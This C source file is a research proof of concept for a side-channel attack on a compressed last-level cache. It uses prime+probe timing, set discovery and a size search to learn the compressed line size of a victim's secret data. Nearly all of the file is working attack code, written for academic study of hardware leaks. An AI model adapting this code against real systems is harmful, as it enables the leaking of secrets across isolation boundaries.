/* Author: Po-An Tsai (poantsai@csail.mit.edu)
 * A PoC that shows we can learn the compressed line size using with the 
 * compressed LLC. Victim and attacker are in the same process just for faster
 * synchronization. They won't share addresses.
 */

#include <string.h>
#include <stdio.h>
#include <strings.h>

#include "rdtsc.h"
#include "constants.h"
#include "patterns.h"

static char footprint[2 * CACHE_SIZE] __attribute__( ( aligned ( CACHE_SIZE ) ) );
static char dummy[CACHE_SIZE] __attribute__( ( aligned ( CACHE_SIZE) ) );

int PrimeSet(long set) {
    char tmp = 0;
    for (long addr = LINESIZE * set; addr < CACHE_SIZE; addr += LINESIZE * NUM_SETS) {
        //printf("Accessing %lx \n", (long unsigned int)(footprint + addr));
        tmp += footprint[addr];
    }
    return tmp;
}

int FillSet(long set) {
    char tmp = 0;
    for (long addr = LINESIZE * set; addr < CACHE_SIZE; addr += LINESIZE * NUM_SETS) {
        //printf("Accessing %lx \n", (long unsigned int)(footprint + addr));
      memcpy(footprint+addr, B8D8, LINESIZE);
    }
    return tmp;
}

int FlushSet(long set) {
    char tmp = 0;
    for (long addr = LINESIZE * set; addr < CACHE_SIZE; addr += LINESIZE * NUM_SETS) {
      memcpy(dummy+addr, B8D8, LINESIZE);
      /* tmp += dummy[addr]; */
    }
    return tmp;
}

int ProbeSet(long set) { // return how many misses the set has
    char tmp = 0;
    long now = 0;
    int numMisses = 0;
    for (long addr = LINESIZE * set; addr < CACHE_SIZE; addr += LINESIZE * NUM_SETS) {
        now = rdtsc();
        tmp += footprint[addr];
        long diff = rdtsc() - now;
        //printf("diff %lu \n", diff);
        if (diff > LLC_LATENCY && diff < MEM_LATENCY) numMisses++;
    }
    return numMisses;
}

void PrimeSetWithSize(long set, int size){
    // Update the lines to be the target size;
    long addr = set * LINESIZE;
    long gap = LINESIZE * NUM_SETS;
    // possible sizes in BDI: 8, 16, 20, 24, 34, 36, 40, 64
   
    // Hardcode the data pattern for BDI:
    switch (size) {
        case 24: // B8D2
            memcpy ( footprint + addr, B8D2, LINESIZE);
            for (int i = 1; i < NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
        case 28: // B8D0 + B4D1
            memcpy ( footprint + addr, B8D0, LINESIZE);
            memcpy ( footprint + addr + gap, B4D1, LINESIZE);
            for (int i = 2; i < 1 + NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
        case 30: // B8D0 + B4D1 + B1D0 + B1D0
            memcpy ( footprint + addr, B8D0, LINESIZE);
            memcpy ( footprint + addr + gap, B4D1, LINESIZE);
            memcpy ( footprint + addr + gap*2, B1D0, LINESIZE);
            memcpy ( footprint + addr + gap*3, B1D0, LINESIZE);
            for (int i = 4; i < 3 + NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
        case 40: // B8D4
            memcpy ( footprint + addr, B8D4, LINESIZE);
            for (int i = 1; i < NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
        case 44: // B4D2 + B8D0
            memcpy ( footprint + addr, B4D2, LINESIZE);
            memcpy ( footprint + addr + gap, B8D0, LINESIZE);
            for (int i = 2; i < 1 + NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
        case 48: // B8D4 + B8D0
            memcpy ( footprint + addr, B8D4, LINESIZE);
            memcpy ( footprint + addr + gap, B8D0, LINESIZE);
            for (int i = 2; i < 1 + NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
        case 56: // B8D4 + B8D0 + B8D0
            memcpy ( footprint + addr, B8D4, LINESIZE);
            memcpy ( footprint + addr + gap, B8D0, LINESIZE);
            memcpy ( footprint + addr + gap*2, B8D0, LINESIZE);
            for (int i = 3; i < 2 + NUM_WAYS; i++) {
                memcpy ( footprint + addr + gap*i, B8D8, LINESIZE);
            }
            break;
    } // end switch
}

int PrimeSets(int nsets) {
    //printf("PrimeSets\n");
    int tmp = 0;
    for (int i = 0; i < nsets; i++) tmp += PrimeSet(i);
    return tmp;
}

int FlushSets(int nsets) {
    int tmp = 0;
    for (int i = 0; i < nsets; i++) tmp += FlushSet(i);
    return tmp;
}

int get_evicted_lines(int set, void(*accessSecret)(), void(*flush)()){
  long now, diff;
  // Test the possible sizes in chunks of 8 by prome+probe, if there is more than 1 possibility, do another prime+probe
  long addr = set * LINESIZE;
  flush();
  { // Prime
    long gap = LINESIZE * NUM_SETS;
    for (int i = 7; i >= 0; i--) {
      memcpy ( dummy + addr + gap*i, B8D0, LINESIZE); }
    for (int i = 0; i < NUM_WAYS-1; i++) {
      memcpy ( footprint + addr + gap*i, B8D8, LINESIZE); }
  }

  accessSecret();

  int lines_evicted;
  long offset = 0;
  { // Probe
    unsigned char tmp = 0;
    // Until we get a miss on a line, we count. We access in inverse order to identify the number of evicted sets
    for (lines_evicted = 8; lines_evicted >= 0; lines_evicted--){
      now = rdtsc();
      memcpy(dummy + addr + offset, B8D0, LINESIZE);
      diff = rdtsc() - now;
      offset += LINESIZE*NUM_SETS;
      if (diff > LLC_LATENCY && diff < MEM_LATENCY) break; // If line is no allocated
    }
    // If we reach this point because for has ended: lines_evicted == -1, make the counter 0 again
    if (lines_evicted < 0) lines_evicted++;
  }

  return lines_evicted;
}

/* This should be tweaked to work for FPC! */
int get_set(void (*flush)(), void (*accessKey)(), void (*dummy_access)()){
  int sets[NUM_SETS];
  int cases = 5;
  int steps = cases*2;
  bzero(sets, NUM_SETS*sizeof(int));
  for (int i = 0; i < NUM_SETS; i++) {FillSet(i);}
  for (int j = 0; j < steps; j++){
    flush();
    for (int i = 0; i < NUM_SETS; i++) {
      PrimeSet(i);
    }
    switch (j%cases){
    case 0: accessKey(); break;
    case 1: case 2: dummy_access(); break;
    default: break;
    }
    for (int i = 0; i < NUM_SETS; i++) {
      sets[i] += ProbeSet(i);
    }
  }

  int c = 0;
  int set = 0;
  for(int x = 0; x < NUM_SETS; x++) {
    if(sets[x] == NUM_WAYS*(steps/cases)){
      PrimeSet(x);
      accessKey();
      int misses = ProbeSet(x);
      if (misses == 0) {
	c++;
	set = x;
	printf("[CM] Possible set: %i (%i), misses: %i\n", x, sets[x], misses);
      }
    }}
  printf("[CM] Number of possible sets : %i\n", c);

  return set;
}

// Original version with binary search
int get_size(int set, void(*accessSecret)(), void(*flush)()){
  // Do a binary search until find compressed size
  int sizes[8] = {8, 16, 20, 24, 34, 36, 40, 64}; // possible sizes in BDI
  int lo = 0;
  int hi = 7;
  while (lo != hi) {
    int mid = (lo + hi) / 2;
    int testSize = LINESIZE - sizes[mid];
    flush();
    PrimeSetWithSize(set, testSize);
    accessSecret();
    int misses = ProbeSet(set);
    if (misses == 0) {
      hi = mid;
    } else {
      lo = mid + 1;
    }
  }
  // Resulting compressed size is sizes[lo]
  return sizes[lo];
}

// Alternative version which don't use the binary search, reducing the victim stress (only works in the case of the compressed cache is LRU)
int get_size_LRU(int set, void(*accessSecret)(), void(*flush)()){
  // Test the possible sizes in chunks of 8 by Pack+probe, if there is more than 1 possibility, do another Pack+probe
  long addr = set * LINESIZE;
  flush();
  { // Prime
    long gap = LINESIZE * NUM_SETS;
    for (int i = 7; i >= 0; i--) {
      memcpy ( dummy + addr + gap*i, B8D0, LINESIZE); }
    for (int i = 0; i < NUM_WAYS-1; i++) {
      memcpy ( footprint + addr + gap*i, B8D8, LINESIZE); }
  }

  accessSecret();

  int lines_evicted;
  { // Probe
    unsigned char tmp = 0;
    // Until we get a miss on a line, we count. We access in inverse order to identify the number of evicted sets
    int offset = 0;
    for (lines_evicted = 8; lines_evicted >= 0; lines_evicted--){
      long now = rdtsc();
      tmp += dummy[addr+offset];
      long diff = rdtsc() - now;
      offset += LINESIZE*NUM_SETS;
      if (diff > LLC_LATENCY && diff < MEM_LATENCY) break; // If line is no allocated
    }
    // If we reach this point because for has ended: lines_evicted == -1, make the counter 0 again
    if (lines_evicted < 0) lines_evicted++;
  }
  
  // Do translation from evicted lines to sizes
  switch(lines_evicted) {
    // When there are multiple possible values, if priming the lowest with the lower size fails, then is the bigger one
  case 5:
    flush();
    PrimeSetWithSize(set, LINESIZE-34);
    accessSecret();
    if(!ProbeSet(set)) return 34;
    else {
      flush();
      PrimeSetWithSize(set, LINESIZE-36);
      accessSecret();
      if(!ProbeSet(set)) return 36;
      else return 40;
    }; break;
  case 3:
    flush();
    PrimeSetWithSize(set, LINESIZE-20);
    accessSecret();
    if(!ProbeSet(set)) return 20;
    else return 24; break;
  case 2: return 16; break;
  case 1: return 8; break;
    /*case 8: */
  default: return 64; break;
  }
}

